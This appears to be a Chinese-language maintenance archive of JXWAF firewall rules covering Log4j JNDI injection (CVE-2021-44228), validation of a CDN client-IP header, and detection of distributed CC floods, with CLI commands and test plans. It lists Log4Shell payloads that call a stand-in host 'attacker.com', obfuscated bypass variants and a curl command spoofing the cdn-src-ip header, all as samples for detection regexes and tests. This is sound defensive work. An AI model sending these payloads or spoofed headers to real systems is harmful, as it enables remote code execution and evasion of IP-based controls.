# JXWAF 安全规则配置档案

> 本文档记录针对特定漏洞/攻击类型的 JXWAF 防护规则设计方案，包含攻击分析、绕过手法、规则架构、CLI 命令和测试用例。
>
> 每次新增防护规则后，在此文档中记录完整档案，供后续维护和参考。

---

## 档案模板

新增漏洞防护时，按以下结构编写：

```
## N. [漏洞名称]

### N.1 攻击分析
### N.2 绕过手法与对抗策略
### N.3 规则架构
### N.4 CLI 命令
### N.5 测试用例
### N.6 覆盖矩阵
### N.7 部署流程
```

---

## 一、Log4j JNDI 注入（CVE-2021-44228）

### 1.1 攻击分析

Log4j（Log4Shell）漏洞允许攻击者通过 JNDI 注入实现远程代码执行。核心特征是利用 `${...}` 查找语法触发 JNDI 协议请求。

**典型 Payload：**

| 攻击类型 | Payload |
|----------|---------|
| LDAP 注入 | `${jndi:ldap://attacker.com/a}` |
| RMI 注入 | `${jndi:rmi://attacker.com:1099/obj}` |
| DNS 外带 | `${jndi:dns://attacker.com/a}` |
| IIOP 注入 | `${jndi:iiop://attacker.com/a}` |
| LDAPS 注入 | `${jndi:ldaps://attacker.com/a}` |

**注入位置：** URL 参数、请求路径、User-Agent、Referer、X-Forwarded-For、Cookie、POST Body（JSON/表单）等所有请求字段。

### 1.2 绕过手法与对抗策略

| 绕过类别 | 手法 | Payload 示例 | 对抗策略 |
|----------|------|-------------|----------|
| 大小写混淆 | `lower`/`upper` 查找 | `${${lower:j}ndi:ldap://...}` | 检测 `${lower:` `${upper:` 前缀 |
| 空字符串默认值 | `::-` 语法 | `${${::-j}${::-n}${::-d}${::-i}:ldap://...}` | 检测 `${::-` 模式 |
| 环境变量默认值 | `env` 查找 | `${${env:BARFOO:-j}ndi:ldap://...}` | 检测 `${env:` 前缀 |
| 系统属性默认值 | `sys` 查找 | `${${sys:user.dir:-j}ndi:ldap://...}` | 检测 `${sys:` 前缀 |
| 日期/Java 查找 | `date`/`java` | `${${date:yyyyMMdd}...}` | 检测 `${date:` `${java:` 前缀 |
| 嵌套查找 | 多层 `${...}` | `${${lower:${lower:j}}ndi:...}` | 检测 `${${` 嵌套模式 |
| URL 编码 | `%24%7Bjndi:...` | `%24%7Bjndi:ldap://...%7D` | uriDecode 预处理 |
| POST Body | JSON/表单体 | `{"user":"${jndi:ldap://...}"}` | 单独规则检测 raw_body |
| 非标准 Header | X-Forwarded-For | `X-Forwarded-For: ${jndi:ldap://...}` | raw_header 全覆盖 |

### 1.3 规则架构

采用 **4 条规则分层防御**，所有规则初始为 `watch` 模式，确认无误报后切换 `block`。

```
请求到达
  │
  ├── 规则3: block_log4j_nested_lookup       ← ${${ 嵌套检测（兜底规则）
  ├── 规则2: block_log4j_lookup_obfuscation  ← lower/upper/::-/env/sys/date/java
  ├── 规则1: block_log4j_jndi_injection      ← 基础 ${jndi: 和 jndi:protocol://
  └── 规则4: block_log4j_post_body           ← POST Body 注入
```

**规则详情：**

| # | 规则名 | 匹配字段 | 正则 | 说明 |
|---|--------|----------|------|------|
| 1 | `block_log4j_jndi_injection` | request_uri, raw_header, cookie | `\$\{[^}]*jndi:\|jndi:(ldap\|rmi\|dns\|ldaps\|iiop\|corba\|nis\|http\|nis)://` | 基础 JNDI 注入 + 直接协议字符串 |
| 2 | `block_log4j_lookup_obfuscation` | request_uri, raw_header, cookie | `\$\{(lower\|upper\|env\|sys\|date\|java):\|\$\{::-` | 混淆技术前缀检测 |
| 3 | `block_log4j_nested_lookup` | request_uri, raw_header, cookie | `\$\{\$\{` | 嵌套查找兜底，覆盖所有嵌套混淆变体 |
| 4 | `block_log4j_post_body` | raw_body | 同规则 1 | POST Body 注入检测 |

> **所有规则均配置 `args_prepocess: ["uriDecode"]`**，防御 URL 编码绕过。
>
> **PCRE 选项 `oij`** 自动忽略大小写，防御大小写变换绕过（如 `JNDI:`、`Jndi:` 等）。

### 1.4 CLI 命令

确保 `config.env` 中 `JXWAF_WAF_AUTH` 已配置有效 Token。

```bash
# 规则1：基础 JNDI 注入检测
python3 tools/waf_cli.py web-rule --group default create \
  --name block_log4j_jndi_injection \
  --detail "防护Log4j JNDI注入漏洞攻击(CVE-2021-44228)，检测request_uri/Header/Cookie中的JNDI注入payload" \
  --matchs '[{"match_args": [{"key": "http_args", "value": "request_uri"}, {"key": "http_args", "value": "raw_header"}, {"key": "http_args", "value": "cookie"}], "args_prepocess": ["uriDecode"], "match_operator": "rx", "match_value": "\\$\\{[^}]*jndi:|jndi:(ldap|rmi|dns|ldaps|iiop|corba|nis|http|nis)://"}]' \
  --action watch

# 规则2：混淆技术检测
python3 tools/waf_cli.py web-rule --group default create \
  --name block_log4j_lookup_obfuscation \
  --detail "防护Log4j混淆绕过：检测${lower:}/${upper:}/${::-}/${env:}/${sys:}/${date:}/${java:}等Log4j专有查找模式" \
  --matchs '[{"match_args": [{"key": "http_args", "value": "request_uri"}, {"key": "http_args", "value": "raw_header"}, {"key": "http_args", "value": "cookie"}], "args_prepocess": ["uriDecode"], "match_operator": "rx", "match_value": "\\$\\{(lower|upper|env|sys|date|java):|\\$\\{::-"}]' \
  --action watch

# 规则3：嵌套查找检测
python3 tools/waf_cli.py web-rule --group default create \
  --name block_log4j_nested_lookup \
  --detail "防护Log4j嵌套查找绕过：检测${${模式，覆盖所有嵌套混淆变体" \
  --matchs '[{"match_args": [{"key": "http_args", "value": "request_uri"}, {"key": "http_args", "value": "raw_header"}, {"key": "http_args", "value": "cookie"}], "args_prepocess": ["uriDecode"], "match_operator": "rx", "match_value": "\\$\\{\\$\\{"}]' \
  --action watch

# 规则4：POST Body 检测
python3 tools/waf_cli.py web-rule --group default create \
  --name block_log4j_post_body \
  --detail "防护Log4j JNDI注入-POST Body检测，覆盖JSON/表单体中的注入payload" \
  --matchs '[{"match_args": [{"key": "http_args", "value": "raw_body"}], "args_prepocess": ["uriDecode"], "match_operator": "rx", "match_value": "\\$\\{[^}]*jndi:|jndi:(ldap|rmi|dns|ldaps|iiop|corba|nis|http|nis)://"}]' \
  --action watch
```

### 1.5 测试用例

测试用例位于 `tests/payloads.json`，共 16 条：

| 测试用例 | 攻击类型 | 期望结果 | 触发规则 |
|----------|----------|:------:|:--------:|
| `web_rule_log4j_jndi_ldap` | LDAP 注入 | block | 规则1 |
| `web_rule_log4j_jndi_rmi` | RMI 注入 | block | 规则1 |
| `web_rule_log4j_jndi_dns` | DNS 外带 | block | 规则1 |
| `web_rule_log4j_jndi_header` | User-Agent 注入 | block | 规则1 |
| `web_rule_log4j_jndi_urlencoded` | URL 编码绕过 | block | 规则1 |
| `web_rule_log4j_lower_obfuscation` | lower 混淆 | block | 规则2 + 规则3 |
| `web_rule_log4j_upper_obfuscation` | upper 混淆 | block | 规则2 + 规则3 |
| `web_rule_log4j_empty_default_obfuscation` | ::- 空字符串 | block | 规则2 + 规则3 |
| `web_rule_log4j_env_obfuscation` | env 默认值 | block | 规则2 + 规则3 |
| `web_rule_log4j_sys_obfuscation` | sys 默认值 | block | 规则2 + 规则3 |
| `web_rule_log4j_double_nested` | 双层嵌套 | block | 规则3 |
| `web_rule_log4j_header_xforwarded` | X-Forwarded-For 注入 | block | 规则1 |
| `web_rule_log4j_header_referer` | Referer 注入 | block | 规则1 |
| `web_rule_log4j_post_json_body` | POST JSON Body | block | 规则4 |
| `web_rule_log4j_post_form_body` | POST 表单 Body | block | 规则4 |
| `web_rule_log4j_normal_pass` | 正常请求 | pass | — |

### 1.6 覆盖矩阵

| 绕过手法 | 规则1 | 规则2 | 规则3 | 规则4 |
|----------|:-----:|:-----:|:-----:|:-----:|
| `${jndi:ldap://...}` | ✓ | — | — | — |
| `${jndi:rmi://...}` | ✓ | — | — | — |
| `${jndi:dns://...}` | ✓ | — | — | — |
| `%24%7Bjndi:ldap://...%7D` | ✓ | — | — | — |
| `${${lower:j}ndi:ldap://...}` | — | ✓ | ✓ | — |
| `${${upper:j}ndi:ldap://...}` | — | ✓ | ✓ | — |
| `${${::-j}${::-n}${::-d}${::-i}:ldap://...}` | — | ✓ | ✓ | — |
| `${${env:BARFOO:-j}ndi:ldap://...}` | — | ✓ | ✓ | — |
| `${${sys:user.dir:-j}ndi:ldap://...}` | — | ✓ | ✓ | — |
| `${${date:yyyyMMdd}...}` | — | ✓ | — | — |
| `${${java:version}...}` | — | ✓ | — | — |
| `${${lower:${lower:j}}ndi:...}` | — | — | ✓ | — |
| POST JSON Body | — | — | — | ✓ |
| POST Form Body | — | — | — | ✓ |
| Header (任意) | ✓ | ✓ | ✓ | — |

### 1.7 部署流程

```
1. 确认 config.env 中 JXWAF_WAF_AUTH 已配置
2. 执行 4 条 CLI 命令创建规则（均为 watch 模式）
3. 观察日志 waf_module=web_rule_protection，确认无业务误报
4. 确认无误后，将 action 从 watch 改为 block：

   python3 tools/waf_cli.py web-rule --group default edit \
     --name block_log4j_jndi_injection \
     --matchs '...' --action block
   # ... 重复其他 3 条规则

5. 运行批量验证确认规则生效：

   python3 tools/verify.py --batch tests/payloads.json \
     --base-url https://your-domain.com \
     --filter "log4j"
```

> **误报排查**：若规则3（`${${`）产生误报（如 URL 参数合法含 `{{`），可改为低优先级或禁用，规则1 和 2 仍提供主要防护。

### 1.8 性能说明

- 规则1、2、3 均匹配 `raw_header`（JSON 序列化后的完整 Header），数据量较小，性能影响低
- 规则4 匹配 `raw_body`，对大型 POST 请求有效能消耗，但正则简单且 PCRE JIT 编译，影响可控
- 所有正则均为简单前缀匹配或短模式，无复杂回溯
- 建议将规则4 优先级设为最低（`rule_order_time` 最大），避免不必要的 body 扫描

---

## 二、CDN 源 IP 提取（带白名单校验）

### 2.1 攻击分析

当 WAF 前面有 CDN（如华为云 CDN）时，WAF 看到的是 CDN 的回源 IP，而非真实客户端 IP。CDN 通常会将客户端 IP 放入自定义 Header（如 `cdn-src-ip`）透传给源站。

**安全风险：**
- 若直接信任 `cdn-src-ip` 头而不校验来源，攻击者可伪造该 Header，绕过 WAF 的 IP 防护策略（IP 黑/白名单、频率限制等）。
- 攻击者可在请求中携带 `cdn-src-ip: 127.0.0.1`，伪装为内网 IP 绕过所有 IP 限制。

**攻击示例：**

```bash
# 攻击者伪造 CDN 头，伪装为白名单 IP
curl https://target.com/api/admin \
  -H "cdn-src-ip: 10.0.0.1"
```

### 2.2 绕过手法与对抗策略

| 绕过手法 | Payload 示例 | 对抗策略 |
|----------|-------------|----------|
| 直接伪造 cdn-src-ip | `cdn-src-ip: 127.0.0.1` | 校验来源 IP 是否在 CDN 网段白名单内 |
| 伪造 x-forwarded-for | `x-forwarded-for: 1.1.1.1` | 不使用 x-forwarded-for，由 CDN 专用 Header 传递 |
| 多层代理混淆 | 请求经过多层代理 | 仅信任 CDN 到源站的直连 IP |

### 2.3 规则架构

采用 **防护组件** 实现，在 `base_component` 阶段（最早执行）完成 IP 覆盖。

```
请求到达
  │
  ├── access_init              初始 src_ip = CDN 回源 IP
  │
  ├── base_component
  │     └── cdn_src_ip_extract  检查 src_ip 是否在白名单网段
  │           ├── 是 → ngx.ctx.src_ip = cdn-src-ip 值
  │           └── 否 → 保持原始 src_ip（不信任 cdn-src-ip）
  │
  ├── global_name_list          使用覆盖后的 src_ip
  ├── flow_white_rule
  ├── flow_rule_protection
  ├── web_white_rule
  └── web_rule_protection       所有后续模块均使用覆盖后的 src_ip
```

**组件详情：**

| 项目 | 内容 |
|------|------|
| 组件名 | `cdn_src_ip_extract` |
| 检测逻辑 | 读取 `conf_data.cdn_whitelist_cidrs`，检查 `src_ip` 是否在任一 CIDR 内 |
| IP 提取 | 从 `cdn-src-ip` 请求头取值，验证格式后覆盖 `ngx.ctx.src_ip` |
| 配置方式 | `conf` 字段 JSON，`cdn_whitelist_cidrs` 数组可自定义 CDN 网段 |

**组件配置（conf.json）：**

```json
{
  "cdn_whitelist_cidrs": ["8.134.210.0/24", "36.21.208.0/24"]
}
```

> 如需更换 CDN 厂商（如阿里云、腾讯云），只需修改 `cdn_whitelist_cidrs` 数组中的网段即可。

### 2.4 CLI 命令

确保 `config.env` 中 `JXWAF_WAF_AUTH` 已配置有效 Token。

```bash
# 创建组件
python3 tools/waf_cli.py component create \
  --name cdn_src_ip_extract \
  --detail "CDN源IP提取组件：校验来源IP在CDN白名单网段后，从cdn-src-ip请求头提取真实客户端IP并覆盖ngx.ctx.src_ip" \
  --code-file generated/components/cdn_src_ip_extract/code.lua \
  --conf "$(cat generated/components/cdn_src_ip_extract/conf.json)"
```

### 2.5 测试用例

| 测试场景 | 请求特征 | 期望结果 |
|----------|----------|:------:|
| CDN 回源 + 有效 cdn-src-ip | src_ip 在白名单网段，cdn-src-ip=1.2.3.4 | src_ip 被覆盖为 1.2.3.4 |
| 非 CDN 来源（伪造 cdn-src-ip） | src_ip 不在白名单网段，cdn-src-ip=127.0.0.1 | src_ip 保持不变（不信任） |
| CDN 回源但无 cdn-src-ip | src_ip 在白名单网段，无 cdn-src-ip 头 | src_ip 保持不变 |
| CDN 回源 + 非法 IP | src_ip 在白名单网段，cdn-src-ip=not_an_ip | src_ip 保持不变 |

### 2.6 覆盖矩阵

| CDN 厂商 | 网段示例 | 需配置的 CIDR |
|----------|---------|---------------|
| 华为云 CDN | 8.134.210.0/24, 36.21.208.0/24 | `["8.134.210.0/24", "36.21.208.0/24"]` |
| 阿里云 CDN | 需查询阿里云 CDN 回源 IP 段 | 按需添加 |
| 腾讯云 CDN | 需查询腾讯云 CDN 回源 IP 段 | 按需添加 |

> **注意**：CDN 厂商的回源 IP 段可能会变更，建议定期检查更新。

### 2.7 部署流程

```
1. 确认 CDN 已将客户端 IP 放入 cdn-src-ip 头透传
2. 确认 CDN 回源 IP 网段（从 CDN 控制台查询），更新 conf.json 中的 cdn_whitelist_cidrs
3. 执行 CLI 命令创建组件（status 默认 true）
4. 观察日志 waf_module=base_component，确认 src_ip 覆盖生效
5. 验证：
   - 从 CDN 白名单 IP 发起请求 → src_ip 被覆盖
   - 从非白名单 IP 发起请求（伪造 cdn-src-ip）→ src_ip 不被覆盖
```

### 2.8 性能说明

- 组件在 `base_component` 阶段执行，每次请求仅做 1 次 CIDR 位运算 + 1 次 Header 读取
- CIDR 匹配使用位运算（与操作），无正则、无字符串遍历，性能开销极低
- 组件逻辑由 `pcall` 包裹，异常不影响后续模块

---

## 三、CC 攻击接口自动人机识别防护

### 3.1 攻击分析

CC 攻击（Challenge Collapsar）通过大量 IP 对特定 URL 接口发起高频请求，耗尽服务器资源。与单 IP CC 攻击不同，分布式 CC 攻击使用大量肉鸡 IP，每个 IP 的请求频率可能不高，但聚合后对单一接口形成巨大压力。

**攻击特征：**
- 短时间内大量不同 IP 访问同一 URL 接口
- 每个 IP 在 1 分钟内请求数超过 100 次
- 高频 IP 数量超过 1000 个（表明攻击源分布广）

**与流量防护规则的区别：**
- 流量防护规则按 `src_ip` 统计频率，适合单 IP 限速
- 本组件按 `path` 聚合高频 IP 数，适合检测分布式 CC 攻击对单一接口的集中打击

### 3.2 绕过手法与对抗策略

| 绕过手法 | 说明 | 对抗策略 |
|----------|------|----------|
| 低频慢速攻击 | 单 IP 控制在阈值以下 | 阈值可配置，结合业务峰值调整 |
| 分布式 IP 池 | 使用大量代理 IP | 检测高频 IP 总量（>1000），而非单 IP 频率 |
| 轮换攻击接口 | 频繁切换目标 URL | 组件按 path 独立统计，每个接口独立判定 |
| 防护期内继续攻击 | 触发防护后仍持续请求 | 防护期内所有请求触发人机识别，过滤非浏览器流量 |

### 3.3 规则架构

采用 **防护组件** 实现，在 `base_component` 阶段完成检测与处置。

```
请求到达
  │
  ├── base_component
  │     └── cc_attack_detect
  │           ├── 检查 path 是否已处于防护状态
  │           │     ├── 是 → 直接触发 bot_check（人机识别）
  │           │     └── 否 → 继续统计
  │           ├── 统计 (path, src_ip) 在 60s 内的请求数
  │           ├── 请求数 > 100 → 标记为高频 IP
  │           ├── 累计该 path 的高频 IP 数
  │           └── 高频 IP 数 > 1000 → 开启 path 防护（600s）+ 触发 bot_check
  │
  └── 后续模块正常执行（若未触发 bot_check）
```

**共享字典 key 设计（ngx.shared.jxwaf_user）：**

| key 格式 | 用途 | TTL |
|----------|------|-----|
| `cc_attack_defense_freq\|<path>\|<src_ip>` | (path, ip) 请求计数 | stat_time（60s） |
| `cc_attack_defense_marked\|<path>\|<src_ip>` | 高频 IP 标记（防重复计数） | stat_time（60s） |
| `cc_attack_defense_count\|<path>` | path 的高频 IP 累计数量 | stat_time（60s） |
| `cc_attack_defense_protect\|<path>` | path 防护开启标记 | protect_time（600s） |

**关键实现细节：**
1. **原子标记**：使用 `incr(marked_key, 1, 0, stat_time)` 返回值判断是否首次标记（返回 1 = 首次），避免同一 IP 重复计数
2. **TTL 不刷新**：`incr` 的 TTL 仅在 key 首次创建时设置，后续 incr 不刷新 TTL，实现固定时间窗口统计
3. **防护期内全量拦截**：path 进入防护状态后，所有访问该 path 的请求均触发 bot_check，由人机识别机制过滤非浏览器流量

### 3.4 CLI 命令

```bash
# 部署组件（使用 Lua 源码文件，自动 Base64 编码）
python3 tools/waf_cli.py component create \
  --name cc_attack_detect \
  --detail "CC攻击接口自动人机识别防护：60秒内单IP请求超100次且这样的IP超1000个则对该接口开启10分钟人机识别" \
  --code-file generated/cc_attack_defense/components/cc_attack_detect/code.lua \
  --conf "$(cat generated/cc_attack_defense/components/cc_attack_detect/conf.json)"
```

### 3.5 测试用例

| 场景 | 模拟方式 | 预期结果 |
|------|----------|----------|
| 正常访问 | 单 IP 60s 内请求 /api/test 50 次 | 不触发防护 |
| 单 IP 高频 | 单 IP 60s 内请求 /api/test 101 次 | 标记为高频 IP，但高频 IP 数 < 1000，不开启防护 |
| 分布式 CC | 1001 个 IP 各对 /api/test 请求 101 次（60s 内） | 开启 /api/test 防护，后续请求触发 bot_check |
| 防护期内访问 | 防护开启后，任意 IP 访问 /api/test | 触发 bot_check（滑块验证） |
| 防护过期 | 防护开启 10 分钟后 | 防护标记过期，恢复正常访问 |
| 不同接口独立 | /api/test 被攻击开启防护，/api/other 不受影响 | /api/other 正常访问 |

### 3.6 部署流程

```
1. 确认 ngx.shared.jxwaf_user 共享字典内存充足（建议 ≥ 10MB）
2. 根据业务峰值调整 conf.json 中的阈值参数
3. 执行 CLI 命令创建组件（status 默认 true）
4. 观察日志 waf_module=component waf_policy=防护组件-cc_attack_detect
5. 验证：
   - 正常流量不触发 bot_check
   - 模拟分布式 CC 攻击，确认接口防护被触发
   - 防护期内访问目标接口触发滑块验证
   - 防护过期后恢复正常
```

### 3.7 性能说明

- 组件在 `base_component` 阶段执行，每次请求最多 2 次共享字典 `incr` + 1 次 `get`，无正则、无外部调用
- 共享字典操作为内存级原子操作，性能开销极低
- 组件逻辑由 `pcall` 包裹，异常不影响后续模块
- 内存消耗与 (path, src_ip) 组合数成正比，TTL 机制保证过期数据自动清理
